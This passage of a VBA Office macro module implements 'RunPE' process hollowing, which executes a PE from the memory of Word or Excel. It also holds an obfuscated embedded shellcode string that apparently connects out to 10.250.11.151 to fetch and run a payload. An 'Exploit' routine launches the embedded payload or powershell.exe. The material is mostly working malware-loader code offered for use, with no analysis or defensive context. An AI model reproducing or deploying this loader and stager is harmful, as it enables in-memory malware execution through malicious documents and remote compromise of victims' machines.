    strPE = B(A(A(B(strPE, "3\x53\x53\x53\xe8\x3e\x00\x00\x00\x4d\x6f"), 34), 10), "buf += ")
    strPE = B(A(B(strPE, "b"), 34), "\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x57")
    strPE = B(A(B(A(A(B(strPE, "\x69"), 34), 10), "buf += b"), 34), "\x6e\x64\x6f\x77\x73\x20\x4e\x54\x2")
    strPE = B(A(B(A(A(B(strPE, "0\x36\x2e\x31\x3b"), 34), 10), "buf += b"), 34), "\x20\x54\x72\x69\x64\x")
    strPE = B(A(B(A(A(B(strPE, "65\x6e\x74\x2f\x37\x2e\x30\x3b"), 34), 10), "buf += b"), 34), "\x20\x72\")
    strPE = B(A(A(B(strPE, "x76\x3a\x31\x31\x2e\x30\x29\x20\x6c\x69\x6b"), 34), 10), "buf +")
    strPE = B(A(B(strPE, "= b"), 34), "\x65\x20\x47\x65\x63\x6b\x6f\x00\x68\x3a\x56\x")
    strPE = B(A(B(A(A(B(strPE, "79\xa7"), 34), 10), "buf += b"), 34), "\xff\xd5\x53\x53\x6a\x03\x53\x53\")
    strPE = B(A(B(A(A(B(strPE, "x68\xbb\x01\x00\x00"), 34), 10), "buf += b"), 34), "\xe8\xc7\x00\x00\x00")
    strPE = B(A(B(A(A(B(strPE, "\x2f\x6a\x32\x5f\x44\x37\x55\x34"), 34), 10), "buf += b"), 34), "\x4d\x5")
    strPE = B(A(A(B(strPE, "2\x43\x55\x34\x74\x7a\x6d\x32\x57\x44\x59\x43"), 34), 10), "buf")
    strPE = B(A(B(strPE, " += b"), 34), "\x38\x77\x42\x7a\x4b\x74\x6d\x51\x4f\x77\x79")
    strPE = B(A(B(A(A(B(strPE, "\x70\x64"), 34), 10), "buf += b"), 34), "\x53\x33\x76\x32\x61\x70\x6a\x3")
    strPE = B(A(B(A(A(B(strPE, "1\x76\x51\x6d\x70\x4f"), 34), 10), "buf += b"), 34), "\x69\x73\x5f\x4f\x")
    strPE = B(A(B(A(A(B(strPE, "5a\x71\x45\x54\x48\x71\x7a\x75\x42"), 34), 10), "buf += b"), 34), "\x47\")
    strPE = B(A(A(B(strPE, "x62\x6d\x34\x64\x66\x43\x33\x36\x52\x4d\x43\x4c"), 34), 10), "b")
    strPE = B(A(B(strPE, "uf += b"), 34), "\x69\x77\x00\x50\x68\x57\x89\x9f\xc6\xff\x")
    strPE = B(A(B(A(A(B(strPE, "d5\x89\xc6"), 34), 10), "buf += b"), 34), "\x53\x68\x00\x02\x68\x84\x53\")
    strPE = B(A(B(A(A(B(strPE, "x53\x53\x57\x53\x56\x68"), 34), 10), "buf += b"), 34), "\xeb\x55\x2e\x3b")
    strPE = B(A(B(A(A(B(strPE, "\xff\xd5\x96\x6a\x0a\x5f\x53\x53\x53"), 34), 10), "buf += b"), 34), "\x5")
    strPE = A(B(strPE, "3\x56\x68\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x75\x14"), 34)
    strPE = B(A(B(A(strPE, 10), "buf += b"), 34), "\x68\x88\x13\x00\x00\x68\x44\xf0\x35\xe0")
    strPE = B(A(B(A(A(B(strPE, "\xff\xd5\x4f"), 34), 10), "buf += b"), 34), "\x75\xe1\xe8\x4a\x00\x00\x0")
    strPE = B(A(B(A(A(B(strPE, "0\x6a\x40\x68\x00\x10\x00"), 34), 10), "buf += b"), 34), "\x00\x68\x00\x")
    strPE = B(A(B(A(A(B(strPE, "00\x40\x00\x53\x68\x58\xa4\x53\xe5\xff"), 34), 10), "buf += b"), 34), "\")
    strPE = B(strPE, "xd5\x93\x53\x53\x89\xe7\x57\x68\x00\x20\x00\x00\x5")
    strPE = B(A(B(A(A(B(strPE, "3"), 34), 10), "buf += b"), 34), "\x56\x68\x12\x96\x89\xe2\xff\xd5\x85\x")
    strPE = B(A(B(A(A(B(strPE, "c0\x74\xcf\x8b"), 34), 10), "buf += b"), 34), "\x07\x01\xc3\x85\xc0\x75\")
    strPE = B(A(B(A(A(B(strPE, "xe5\x58\xc3\x5f\xe8\x7f\xff"), 34), 10), "buf += b"), 34), "\xff\xff\x31")
    strPE = B(A(A(B(strPE, "\x30\x2e\x32\x35\x30\x2e\x31\x31\x2e\x31"), 34), 10), "buf += b")
    strPE = B(A(strPE, 34), "\x35\x31\x00\xbb\xf0\xb5\xa2\x56\x6a\x00\x53\xff\")
    strPE = A(A(B(strPE, "xd5"), 34), 10)

    PE0 = strPE
End Function

Private Function PE() As String
    Dim strPE As String
    strPE = ""
    strPE = strPE + PE0()
    PE = strPE
End Function
' ===== END PE2VBA =====


' ================================================================================
'                                   ~~~ MAIN ~~~
' ================================================================================

' --------------------------------------------------------------------------------
' Method:    RunPE
' Desc:      Main method. Executes a PE from the memory of Word/Excel
' Arguments: baImage - A Byte array representing a PE file
'            strArguments - A String representing the command line arguments
' Returns:   N/A
' --------------------------------------------------------------------------------
Public Sub RunPE(ByRef baImage() As Byte, strArguments As String)

    Debug.Print ("[*] Checking source PE...")
    ' Populate IMAGE_DOS_HEADER structure
    ' |__ IMAGE_DOS_HEADER size is 64 (0x40)
    Dim structDOSHeader As IMAGE_DOS_HEADER
    Dim ptrDOSHeader As LongPtr: ptrDOSHeader = VarPtr(structDOSHeader)
    Call RtlMoveMemory(ptrDOSHeader, VarPtr(baImage(0)), SIZEOF_IMAGE_DOS_HEADER)
    
    
    ' Check Magic Number (i.e. is it a PE file?)
    ' |__ Magic number = 0x5A4D or 23117 or 'MZ'
    If structDOSHeader.e_magic = IMAGE_DOS_SIGNATURE Then
        If VERBOSE Then
            Debug.Print ("    |__ Magic number is OK.")
        End If
    Else
        Debug.Print ("    |__ Input file is not a valid PE.")
        Exit Sub
    End If
    
    
    ' Populate IMAGE_NT_HEADERS structure
    ' |__ IMAGE_NT_HEADERS start at offset DOSHeader->e_lfanew
    ' |__ IMAGE_NT_HEADERS size is 248 (0xf8) (32 bits)
    ' |__ IMAGE_NT_HEADERS size is 264 (0x108) (64 bits)
    Dim structNTHeaders As IMAGE_NT_HEADERS
    Dim ptrNTHeaders As LongPtr: ptrNTHeaders = VarPtr(structNTHeaders)
    Call RtlMoveMemory(ptrNTHeaders, VarPtr(baImage(structDOSHeader.e_lfanew)), SIZEOF_IMAGE_NT_HEADERS)
    
    
    ' Check NT headers Signature
    ' |__ NT Header Signature = 'PE00' or 0x00004550 or 17744
    If structNTHeaders.Signature = IMAGE_NT_SIGNATURE Then
        If VERBOSE Then
            Debug.Print ("    |__ NT Header Signature is OK.")
        End If
    Else
        Debug.Print ("    |__ NT Header Signature is not valid.")
        Exit Sub
    End If
    
    
    ' Check CPU architecture
    If VERBOSE Then
        Debug.Print ("    |__ Machine type: 0x" + Hex(structNTHeaders.FileHeader.Machine))
    End If
    #If Win64 Then
        If structNTHeaders.FileHeader.Machine = IMAGE_FILE_MACHINE_I386 Then
            Debug.Print ("[-] You're trying to inject a 32 bits binary into a 64 bits process!")
            Exit Sub
        End If
    #Else
        If structNTHeaders.FileHeader.Machine = IMAGE_FILE_MACHINE_AMD64 Then
            Debug.Print ("[-] You're trying to inject a 64 bits binary into a 32 bits process!")
            Exit Sub
        End If
    #End If
    
    
    ' Get the path of the current process executable
    Dim strCurrentFilePath As String
    strCurrentFilePath = Space(MAX_PATH) ' Allocate memory to store the path
    Dim lGetModuleFileName As Long
    lGetModuleFileName = GetModuleFileName(0, strCurrentFilePath, MAX_PATH)
    strCurrentFilePath = Left(strCurrentFilePath, InStr(strCurrentFilePath, vbNullChar) - 1) ' Remove NULL bytes
    
    
    ' Format command line
    Dim strCmdLine As String
    strCmdLine = strCurrentFilePath + " " + strArguments
    
    
    ' Create new process in suspended state
    Debug.Print ("[*] Creating new process in suspended state...")
    Dim strNull As String
    Dim structProcessInformation As PROCESS_INFORMATION
    Dim structStartupInfo As STARTUPINFO
    If VERBOSE Then
        Debug.Print ("    |__ Target PE: '" + strCurrentFilePath + "'")
    End If
    Dim lCreateProcess As Long
    lCreateProcess = CreateProcess(strNull, strCurrentFilePath + " " + strArguments, 0&, 0&, False, CREATE_SUSPENDED, 0&, strNull, structStartupInfo, structProcessInformation)
    If lCreateProcess = 0 Then
        Debug.Print ("    |__ CreateProcess() failed (Err: " + Str(Err.LastDllError) + ").")
        Exit Sub
    Else
        If VERBOSE Then
            Debug.Print ("    |__ CreateProcess() OK")
        End If
    End If
    
    
    ' Get Thread Context
    Debug.Print ("[*] Retrieving the context of the main thread...")
    Dim structContext As CONTEXT
    structContext.ContextFlags = CONTEXT_INTEGER 'CONTEXT_FULL
    Dim lGetThreadContext As Long
    #If Win64 Then
        Dim baContext(0 To (LenB(structContext) - 1)) As Byte
        Call RtlMoveMemory(VarPtr(baContext(0)), VarPtr(structContext), LenB(structContext))
        lGetThreadContext = GetThreadContext(structProcessInformation.hThread, VarPtr(baContext(0)))
    #Else
        lGetThreadContext = GetThreadContext(structProcessInformation.hThread, structContext)
    #End If
    If lGetThreadContext = 0 Then
        Debug.Print ("    |__ GetThreadContext() failed (Err:" + Str(Err.LastDllError) + ")")
        Call TerminateProcess(structProcessInformation.hProcess, 0)
        Exit Sub
    Else
        #If Win64 Then
            Call RtlMoveMemory(VarPtr(structContext), VarPtr(baContext(0)), LenB(structContext))
        #End If
        If VERBOSE Then
            Debug.Print ("    |__ GetThreadContext() OK")
        End If
    End If
    
    
    ' Get image base of the target process (if we want to unmap it before injecting our PE)
    ' |__ Image base address is CONTEXT.ebx + 8 (32 bits)
    ' |__ Image base address is CONTEXT.rdx + 16 (64 bits)
    'Debug.Print ("[*] Reading target process base image address...")
    'Dim ptrTargetImageBase As LongPtr
    'Dim ptrTargetImageBaseLocation As LongPtr
    '#If Win64 Then
    '    ptrTargetImageBaseLocation = structContext.Rdx + 16
    '#Else
    '    ptrTargetImageBaseLocation = structContext.Ebx + 8
    '#End If
    
    'Dim lReadProcessMemory As Long
    'lReadProcessMemory = ReadProcessMemory(structProcessInformation.hProcess, ptrTargetImageBaseLocation, VarPtr(ptrTargetImageBase), SIZEOF_ADDRESS, 0)
    'If lReadProcessMemory = 0 Then
    '    Debug.Print ("    |__ ReadProcessMemory() failed (Err:" + Str(Err.LastDllError) + ")")
    '    Call TerminateProcess(structProcessInformation.hProcess, 0)
    '    Exit Sub
    'Else
    '    If VERBOSE Then
    '        Debug.Print ("    |__ Target process image base address: Ox" + Hex(ptrTargetImageBase))
    '    End If
    'End If
    
    
    ' Unmap target image (optional)
    ' We don't really need to unmap the current image
    
    
    ' Get Relocation directory and check if the PE has a relocation table
    ' |__ NTHeaders.OptionalHeader.DataDirectory[5]
    Dim structRelocDirectory As IMAGE_DATA_DIRECTORY
    Call RtlMoveMemory(VarPtr(structRelocDirectory), VarPtr(structNTHeaders.OptionalHeader.DataDirectory(IMAGE_DIRECTORY_ENTRY_BASERELOC)), SIZEOF_IMAGE_DATA_DIRECTORY)
    
    Dim ptrDesiredImageBase As LongPtr: ptrDesiredImageBase = 0
    If structRelocDirectory.VirtualAddress = 0 Then
        Debug.Print ("[!] PE has no relocation table, using default base address: 0x" + Hex(structNTHeaders.OptionalHeader.ImageBase))
        ptrDesiredImageBase = structNTHeaders.OptionalHeader.ImageBase
    End If
    

    ' Allocate memory for the source image in the new process
    Debug.Print ("[*] Allocating memory for the source image in process with PID" + Str(structProcessInformation.dwProcessId) + "...")
    If VERBOSE Then
        Debug.Print ("    |__ PE image size: " + Str(structNTHeaders.OptionalHeader.SizeOfImage))
    End If
    Dim ptrProcessImageBase As LongPtr
    ptrProcessImageBase = VirtualAllocEx(structProcessInformation.hProcess, ptrDesiredImageBase, structNTHeaders.OptionalHeader.SizeOfImage, MEM_COMMIT Or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    If ptrProcessImageBase = 0 Then
        Debug.Print ("    |__ VirtualAllocEx() failed (Err:" + Str(Err.LastDllError) + ").")
        Call TerminateProcess(structProcessInformation.hProcess, 0)
        Exit Sub
    Else
        If VERBOSE Then
            Debug.Print ("    |__ VirtualAllocEx() OK - Got Addr: 0x" + Hex(ptrProcessImageBase))
        End If
    End If
    
    
    ' Change the image base saved in headers
    ' |__ IMAGE_NT_HEADERS is at offset: 0 + IMAGE_DOS_HEADER.e_lfanew
    ' |__ IMAGE_NT_HEADERS = Signature || IMAGE_FILE_HEADER || IMAGE_OPTIONAL_HEADER
    ' |__ In IMAGE_OPTIONAL_HEADER32, ImageBase is at offset 28
    ' |__ => ImageBase is at offset: 0 + IMAGE_DOS_HEADER.e_lfanew + 4 + SIZEOF_IMAGE_FILE_HEADER + 28
    ' |__ In IMAGE_OPTIONAL_HEADER64, ImageBase is at offset 24
    ' |__ => ImageBase is at offset: 0 + IMAGE_DOS_HEADER.e_lfanew + 4 + SIZEOF_IMAGE_FILE_HEADER + 24
    If ptrProcessImageBase <> structNTHeaders.OptionalHeader.ImageBase Then
        Dim lImageBaseAddrOffset As Long
        Dim ptrImageBase As LongPtr
        #If Win64 Then
            lImageBaseAddrOffset = 0 + structDOSHeader.e_lfanew + 4 + SIZEOF_IMAGE_FILE_HEADER + 24
        #Else
            lImageBaseAddrOffset = 0 + structDOSHeader.e_lfanew + 4 + SIZEOF_IMAGE_FILE_HEADER + 28
        #End If

        'Call RtlMoveMemory(VarPtr(ptrImageBase), VarPtr(baImage(0 + lImageBaseAddrOffset)), SIZEOF_ADDRESS) ' Read current value
        'Debug.Print ("Current image base: 0x" + Hex(ptrImageBase) + " - Image base to write: 0x" + Hex(ptrProcessImageBase))
        
        Call RtlMoveMemory(VarPtr(baImage(0 + lImageBaseAddrOffset)), VarPtr(ptrProcessImageBase), SIZEOF_ADDRESS) ' Write new value
        
        'Call RtlMoveMemory(VarPtr(ptrImageBase), VarPtr(baImage(0 + lImageBaseAddrOffset)), SIZEOF_ADDRESS) ' Read current value to verify
        'Debug.Print ("New effective image base: 0x" + Hex(ptrImageBase))
    End If


    ' Allocate some memory in the current process to store the source image
    Debug.Print ("[*] Allocating memory for the source image in current process...")
    Dim ptrImageLocalCopy As LongPtr
    ptrImageLocalCopy = VirtualAlloc(0&, structNTHeaders.OptionalHeader.SizeOfImage, MEM_COMMIT Or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    If ptrImageLocalCopy = 0 Then
        Debug.Print ("    |__ VirtualAlloc() failed (Err:" + Str(Err.LastDllError) + ").")
        Call TerminateProcess(structProcessInformation.hProcess, 0)
        Exit Sub
    Else
        If VERBOSE Then
            Debug.Print ("    |__ VirtualAlloc() OK - Got Addr: 0x" + Hex(ptrImageLocalCopy))
        End If
    End If
    
    
    ' Copy source image to local memory
    Debug.Print ("[*] Writing source image in current process...")
    If VERBOSE Then
        Debug.Print ("    |__ Target address: 0x" + Hex(ptrImageLocalCopy))

        Debug.Print ("[*] Writing PE headers...")
        Debug.Print ("    |__ Headers size:" + Str(structNTHeaders.OptionalHeader.SizeOfHeaders))
    End If
    Call RtlMoveMemory(ptrImageLocalCopy, VarPtr(baImage(0)), structNTHeaders.OptionalHeader.SizeOfHeaders)
    
    If VERBOSE Then
        Debug.Print ("[*] Writing PE sections...")
    End If
    Dim iCount As Integer
    Dim structSectionHeader As IMAGE_SECTION_HEADER
    For iCount = 0 To (structNTHeaders.FileHeader.NumberOfSections - 1)
        ' Nth section is at offset:
        '  0 (image base)
        '  + DOSHeader->e_lfanew  Image base address
        '  + 248 OR 264           IMAGE_NT_HEADERS size is 248 (32 bits) or 264 (64 bits)
        '  + N * 40               IMAGE_SECTION_HEADER is 40 (32 & 64 bits)
        Call RtlMoveMemory(VarPtr(structSectionHeader), VarPtr(baImage(structDOSHeader.e_lfanew + SIZEOF_IMAGE_NT_HEADERS + (iCount * SIZEOF_IMAGE_SECTION_HEADER))), SIZEOF_IMAGE_SECTION_HEADER)
        
        Dim strSectionName As String: strSectionName = ByteArrayToString(structSectionHeader.SecName)
        Dim ptrNewAddress As LongPtr: ptrNewAddress = ptrImageLocalCopy + structSectionHeader.VirtualAddress
        Dim lSize As Long: lSize = structSectionHeader.SizeOfRawData
        
        If VERBOSE Then
            Debug.Print ("    |__ Writing section: '" + strSectionName + "' (Size:" + Str(lSize) + ") at 0x" + Hex(ptrNewAddress))
        End If

        Call RtlMoveMemory(ptrNewAddress, VarPtr(baImage(0 + structSectionHeader.PointerToRawData)), lSize)
    Next iCount
    

    ' If the base address of the payload changed, we need to apply relocations
    Debug.Print ("[*] Applying relocations...")
    If ptrProcessImageBase <> structNTHeaders.OptionalHeader.ImageBase Then
        
        Dim lMaxSize As Long: lMaxSize = structRelocDirectory.Size
        Dim lRelocAddr As Long: lRelocAddr = structRelocDirectory.VirtualAddress
        
        Dim structReloc As IMAGE_BASE_RELOCATION
        Dim lParsedSize As Long: lParsedSize = 0
        
        Do While lParsedSize < lMaxSize
        
            Dim ptrStructReloc As LongPtr: ptrStructReloc = ptrImageLocalCopy + lRelocAddr + lParsedSize
            Call RtlMoveMemory(VarPtr(structReloc), ptrStructReloc, SIZEOF_IMAGE_BASE_RELOCATION)
            lParsedSize = lParsedSize + structReloc.SizeOfBlock
            
            If (structReloc.VirtualAddress <> 0) And (structReloc.SizeOfBlock <> 0) Then
                If VERBOSE Then
                    Debug.Print ("    |__ Relocation Block: Addr=0x" + Hex(structReloc.VirtualAddress) + " - Size:" + Str(structReloc.SizeOfBlock))
                End If
                
                Dim lEntriesNum As Long: lEntriesNum = (structReloc.SizeOfBlock - SIZEOF_IMAGE_BASE_RELOCATION) / SIZEOF_IMAGE_BASE_RELOCATION_ENTRY
                Dim lPage As Long: lPage = structReloc.VirtualAddress
                
                Dim ptrBlock As LongPtr: ptrBlock = ptrStructReloc + SIZEOF_IMAGE_BASE_RELOCATION
                Dim iBlock As Integer
                Call RtlMoveMemory(VarPtr(iBlock), ptrBlock, SIZEOF_IMAGE_BASE_RELOCATION_ENTRY)
                
                iCount = 0
                For iCount = 0 To (lEntriesNum - 1)
                    Dim iBlockType As Integer: iBlockType = ((iBlock And &HF000) / &H1000) And &HF ' type = value >> 12
                    Dim iBlockOffset As Integer: iBlockOffset = iBlock And &HFFF ' offset = value & 0xfff
                    'Debug.Print ("    |   |__ Block: Type=" + Str(iBlockType) + " - Offset=0x" + Hex(iBlockOffset))
                    
                    If iBlockType = 0 Then
                        Exit For
                    End If

                    Dim iPtrSize As Integer: iPtrSize = 0
                    If iBlockType = &H3 Then ' 32 bits address
                        iPtrSize = 4
                    ElseIf iBlockType = &HA Then ' 64 bits address
                        iPtrSize = 8
                    End If
                    
                    Dim ptrRelocateAddr As LongPtr
                    ptrRelocateAddr = ptrImageLocalCopy + lPage + iBlockOffset

                    If iPtrSize <> 0 Then
                        Dim ptrRelocate As LongPtr
                        Call RtlMoveMemory(VarPtr(ptrRelocate), ptrRelocateAddr, iPtrSize)
                        ptrRelocate = ptrRelocate - structNTHeaders.OptionalHeader.ImageBase + ptrProcessImageBase
                        Call RtlMoveMemory(ptrRelocateAddr, VarPtr(ptrRelocate), iPtrSize)
                    End If
                    
                    ptrBlock = ptrBlock + SIZEOF_IMAGE_BASE_RELOCATION_ENTRY
                    Call RtlMoveMemory(VarPtr(iBlock), ptrBlock, SIZEOF_IMAGE_BASE_RELOCATION_ENTRY)
                    
                Next iCount
            End If
        Loop
    End If
    
    
    ' Write modified image to target process memory
    Debug.Print ("[*] Writing modified source image to target process memory...")
    Dim lWriteProcessMemory As Long
    lWriteProcessMemory = WriteProcessMemory(structProcessInformation.hProcess, ptrProcessImageBase, ptrImageLocalCopy, structNTHeaders.OptionalHeader.SizeOfImage, 0&)
    If lWriteProcessMemory = 0 Then
        Debug.Print ("    |__ WriteProcessMemory() failed (Err:" + Str(Err.LastDllError) + ")")
        Call TerminateProcess(structProcessInformation.hProcess, 0)
        Exit Sub
    Else
        If VERBOSE Then
            Debug.Print ("    |__ WriteProcessMemory() OK")
        End If
    End If
    
    
    ' Free local memory
    Call VirtualFree(ptrImageLocalCopy, structNTHeaders.OptionalHeader.SizeOfImage, &H10000) ' &H10000 = MEM_FREE
    
    
    ' Applying new image base address to target PEB
    Debug.Print ("[*] Applying new image base address to target PEB...")
    Dim ptrPEBImageBaseAddr As LongPtr
    #If Win64 Then
        ptrPEBImageBaseAddr = structContext.Rdx + 16
    #Else
        ptrPEBImageBaseAddr = structContext.Ebx + 8
    #End If
    
    If VERBOSE Then
        Debug.Print ("    |__ Image base address location: 0x" + Hex(ptrPEBImageBaseAddr))
        Debug.Print ("    |__ Image base address: 0x" + Hex(ptrProcessImageBase))
    End If
    
    lWriteProcessMemory = WriteProcessMemory(structProcessInformation.hProcess, ptrPEBImageBaseAddr, VarPtr(ptrProcessImageBase), SIZEOF_ADDRESS, 0&)
    If lWriteProcessMemory = 0 Then
        Debug.Print ("    |__ WriteProcessMemory() failed (Err:" + Str(Err.LastDllError) + ")")
        Call TerminateProcess(structProcessInformation.hProcess, 0)
        Exit Sub
    Else
        If VERBOSE Then
            Debug.Print ("    |__ WriteProcessMemory() OK")
        End If
    End If
    
    
    ' Overwrite context with new entry point
    Debug.Print ("[*] Overwriting context with new entry point...")
    Dim ptrEntryPoint As LongPtr: ptrEntryPoint = ptrProcessImageBase + structNTHeaders.OptionalHeader.AddressOfEntryPoint
    #If Win64 Then
        structContext.Rcx = ptrEntryPoint
    #Else
        structContext.Eax = ptrEntryPoint
    #End If
    
    If VERBOSE Then
        Debug.Print ("    |__ New entry point: 0x" + Hex(ptrEntryPoint))
    End If
    
    Dim lSetThreadContext As Long
    #If Win64 Then
        Call RtlMoveMemory(VarPtr(baContext(0)), VarPtr(structContext), LenB(structContext))
        lSetThreadContext = SetThreadContext(structProcessInformation.hThread, VarPtr(baContext(0)))
    #Else
        lSetThreadContext = SetThreadContext(structProcessInformation.hThread, structContext)
    #End If
    If lSetThreadContext = 0 Then
        Debug.Print ("    |__ SetThreadContext() failed (Err:" + Str(Err.LastDllError) + ")")
        Call TerminateProcess(structProcessInformation.hProcess, 0)
        Exit Sub
    Else
        If VERBOSE Then
            Debug.Print ("    |__ SetThreadContext() OK")
        End If
    End If
    
    
    ' Resume thread
    ' |__ If ResumeThread succeeds, the return value is the thread's previous suspend count (i.e. 1 in this case)
    Debug.Print ("[*] Resuming suspended process...")
    Dim lResumeThread As Long
    lResumeThread = ResumeThread(structProcessInformation.hThread)
    If lResumeThread = 1 Then
        If VERBOSE Then
            Debug.Print ("    |__ ResumeThread() OK")
        End If
    Else
        Debug.Print ("    |__ ResumeThread() failed (Err:" + Str(Err.LastDllError) + ")")
        Call TerminateProcess(structProcessInformation.hProcess, 0)
        Exit Sub
    End If

    Debug.Print ("[+] RunPE complete!!!")
    
End Sub

' --------------------------------------------------------------------------------
' Method:    Exploit
' Desc:      Calls FileToByteArray to get the content of a PE file as a Byte
'               array and calls the RunPE procedure to execute it from the memory
'               of Word / Excel
' Arguments: N/A
' Returns:   N/A
' --------------------------------------------------------------------------------
Public Sub Exploit()

    Debug.Print ("================================================================================")
    
    Dim strSrcFile As String
    Dim baSrcFileContent() As Byte
    Dim strSrcArguments As String
    Dim strSrcPE As String
    
    'strSrcFile = "C:\Windows\System32\cmd.exe"
    strSrcFile = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
    
    'strSrcFile = "C:\Windows\SysWOW64\cmd.exe"
    'strSrcFile = "C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe"
    
    strSrcArguments = ""
    'strSrcArguments = "-exec Bypass"
    
    strSrcPE = PE()
    If strSrcPE = "" Then
        If Dir(strSrcFile) = "" Then
            Debug.Print ("[-] '" + strSrcFile + "' doesn't exist.")
            Exit Sub
        Else
            Debug.Print ("[*] Source file: '" + strSrcFile + "'")
            If VERBOSE Then
                Debug.Print ("    |__ Command line: " + strSrcFile + " " + strSrcArguments)
            End If
        End If
        baSrcFileContent = FileToByteArray(strSrcFile)
        Call RunPE(baSrcFileContent, strSrcArguments)
    Else
        Debug.Print ("[+] Source file: embedded PE")
        baSrcFileContent = StringToByteArray(strSrcPE)
        Call RunPE(baSrcFileContent, strSrcArguments)
    End If

End Sub
